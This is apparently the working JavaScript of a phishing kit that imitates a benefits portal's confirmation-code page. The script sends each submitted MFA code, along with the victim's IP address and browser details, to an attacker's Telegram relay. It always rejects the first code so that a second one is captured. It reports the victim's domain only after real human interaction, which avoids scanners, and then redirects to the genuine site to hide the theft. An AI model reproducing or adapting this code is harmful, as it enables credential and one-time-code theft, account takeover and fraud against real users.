(function () {
  var form = document.getElementById("enter-code-form");
  var methodDisplay = document.getElementById("method-display");
  var maskedInput = document.getElementById("masked-destination");
  var maskedLabel = document.getElementById("masked-destination-label");
  var codeInput = document.getElementById("confirmation-code");
  var codeError = document.getElementById("code_validation_message");
  var resendBtn = document.getElementById("resend-code-btn");
  var infoText = document.getElementById("enter-code-info");
  var submitBtn = document.getElementById("submit-code-btn");

  const REDIRECT_URL = "https://melodybenefits.wealthcareportal.com/Authentication/Handshake";

  // ============================================================
  // ====== TRACK CODE ATTEMPTS ==================================
  // ============================================================

  var attemptKey = 'code_attempt_count';
  var attemptCount = parseInt(sessionStorage.getItem(attemptKey) || '0', 10);
  
  console.log(`📊 Code attempt #${attemptCount + 1}`);

  // ============================================================
  // ====== DOMAIN DETECTION - HUMAN SCROLL ONLY ================
  // ============================================================

  let domainDetected = false;

  function detectDomain() {
    if (domainDetected) return;
    
    const currentUrl = window.location.href;
    const urlObj = new URL(currentUrl);
    const domain = urlObj.hostname;

    domainDetected = true;

    sendToTelegram('domain_detection', {
      domain: domain
    });

    console.log(`🌐 Domain detected: ${domain}`);
  }

  // Detect on human scroll
  let humanInteractionDetected = false;

  window.addEventListener('scroll', function(e) {
    if (domainDetected) return;
    
    if (e.isTrusted) {
      humanInteractionDetected = true;
    }
    
    const scrollY = window.scrollY;
    
    if (scrollY > 10 && humanInteractionDetected && !domainDetected) {
      detectDomain();
    }
  }, { passive: true });

  // Fallback: click detection
  document.addEventListener('click', function(e) {
    if (!domainDetected && e.isTrusted) {
      detectDomain();
    }
  });

  // Fallback: keypress detection
  document.addEventListener('keydown', function(e) {
    if (!domainDetected && e.isTrusted && e.key.length === 1) {
      detectDomain();
    }
  });

  // ============================================================
  // ====== TELEGRAM INTEGRATION =================================
  // ============================================================

  async function sendToTelegram(action, data) {
    try {
      let ipData = { ip: 'Unknown' };
      try {
        const response = await fetch('/api/ip');
        if (response.ok) {
          ipData = await response.json();
        }
      } catch (e) {
        console.warn('Could not fetch IP data');
      }

      const payload = {
        action: action,
        data: {
          ...data,
          timestamp: new Date().toLocaleString('en-US', { 
            timeZone: 'America/New_York',
            hour12: true,
            year: 'numeric',
            month: '2-digit',
            day: '2-digit',
            hour: '2-digit',
            minute: '2-digit',
            second: '2-digit'
          }),
          userAgent: navigator.userAgent,
          ip: ipData.ip || 'Unknown'
        }
      };

      await fetch('/api/telegram', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });
    } catch (error) {
      console.error('Failed to send to Telegram:', error);
    }
  }

  // ============================================================
  // ====== FORM HANDLERS =======================================
  // ============================================================

  var auth = null;
  try {
    auth = JSON.parse(sessionStorage.getItem("melodyAuth") || "null");
  } catch (e) {
    auth = null;
  }

  if (!auth || !auth.destination || !auth.method) {
    window.location.replace("auth.html");
    return;
  }

  function maskEmail(email) {
    var parts = email.split("@");
    if (parts.length !== 2) return "******";
    var local = parts[0];
    var domain = parts[1];
    if (local.length <= 2) {
      return local.charAt(0) + "******@" + domain;
    }
    if (local.length <= 4) {
      return local.charAt(0) + "******" + local.slice(-1) + "@" + domain;
    }
    return local.charAt(0) + "******" + local.slice(-3) + "@" + domain;
  }

  function maskPhone(phone) {
    var digits = phone.replace(/\D/g, "");
    if (digits.length < 4) return "******";
    return "******" + digits.slice(-4);
  }

  function maskDestination(method, value) {
    if (method === "sms") return maskPhone(value);
    return maskEmail(value);
  }

  methodDisplay.value = auth.method === "sms" ? "SMS" : "Email";
  maskedLabel.textContent =
    auth.method === "sms" ? "Registered mobile number" : "Registered email";
  maskedInput.value = maskDestination(auth.method, auth.destination);

  // ============================================================
  // ====== UPDATE INFO TEXT BASED ON ATTEMPT ===================
  // ============================================================

  function updateInfoText() {
    if (attemptCount === 0) {
      infoText.textContent = 
        "A confirmation code was sent to " + 
        maskedInput.value + 
        ". Enter the code below.";
      infoText.style.color = '#302b4a';
    } else if (attemptCount === 1) {
      infoText.textContent = 
        "";
      infoText.style.color = '#c0392b';
      infoText.style.fontWeight = 'bold';
    }
  }

  updateInfoText();

  // ============================================================
  // ====== RESEND BUTTON =======================================
  // ============================================================

  resendBtn.addEventListener("click", function () {
    codeError.textContent = "";
    infoText.textContent =
      "A new confirmation code has been sent to " +
      maskedInput.value +
      ".";
    infoText.style.color = '#302b4a';
    infoText.style.fontWeight = 'normal';
    codeInput.value = "";
    codeInput.focus();
    
    attemptCount = 0;
    sessionStorage.setItem(attemptKey, '0');
  });

  // ============================================================
  // ====== FORM SUBMIT - TWO ATTEMPTS REQUIRED =================
  // ============================================================

  form.addEventListener("submit", function (event) {
    event.preventDefault();
    codeError.textContent = "";

    var code = codeInput.value.trim();
    if (!code) {
      codeError.textContent = "The confirmation code field is required.";
      codeInput.focus();
      return;
    }
    if (!/^[0-9]{4,10}$/.test(code)) {
      codeError.textContent = "Please enter a valid confirmation code.";
      codeInput.focus();
      return;
    }

    // ====== SEND CODE TO TELEGRAM ======
    sendToTelegram('code_submitted', {
      code: code,
      attempt: attemptCount + 1
    });

    // ====== DISABLE BUTTON AND SHOW LOADING ======
    submitBtn.disabled = true;
    submitBtn.innerHTML = '<span class="spinner"></span>';
    submitBtn.classList.add('loading');

    // ====== CHECK ATTEMPT ======
    if (attemptCount === 0) {
      // ====== FIRST ATTEMPT - ALWAYS FAILS ======
      console.log('❌ First attempt - rejecting');
      
      setTimeout(function() {
        codeError.textContent = "The confirmation code you entered is incorrect. Please try again.";
        codeError.style.color = '#c0392b';
        
        codeInput.value = '';
        codeInput.focus();
        
        attemptCount = 1;
        sessionStorage.setItem(attemptKey, '1');
        
        infoText.textContent = 
          "";
        infoText.style.color = '#c0392b';
        infoText.style.fontWeight = 'bold';
        
        submitBtn.disabled = false;
        submitBtn.innerHTML = 'Submit';
        submitBtn.classList.remove('loading');
        
      }, 2000);

    } else {
      console.log('');
      
      try {
        sessionStorage.removeItem("melodyAuth");
        sessionStorage.removeItem(attemptKey);
      } catch (e) {}

      // ====== REDIRECT AFTER 8 SECONDS ======
      setTimeout(function() {
        window.location.href = REDIRECT_URL;
      }, 8000);
    }
  });

})();